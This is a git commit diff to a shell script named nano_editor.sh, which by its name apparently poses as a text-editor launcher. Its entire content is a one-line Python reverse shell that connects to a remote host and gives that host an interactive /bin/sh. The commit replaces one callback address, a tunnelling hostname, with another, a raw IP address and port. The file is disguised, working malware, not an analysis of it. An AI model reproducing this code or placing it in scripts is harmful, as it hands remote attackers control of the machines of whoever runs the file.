e3c9d663566a42d96bb3fce5e8e0338688cdadf5
Ujjwal Pratap Singh <85453780+ujjwaltwitx@users.noreply.github.com>
2023-01-07 00:43:33 +0530

    Update nano_editor.sh

--- nano_editor.sh
+++ nano_editor.sh
@@ -1,2 +1,2 @@
 #! /bin/bash
-python3 -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("in1.localtonet.com",37519));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+python3 -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("147.185.221.180",21504));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
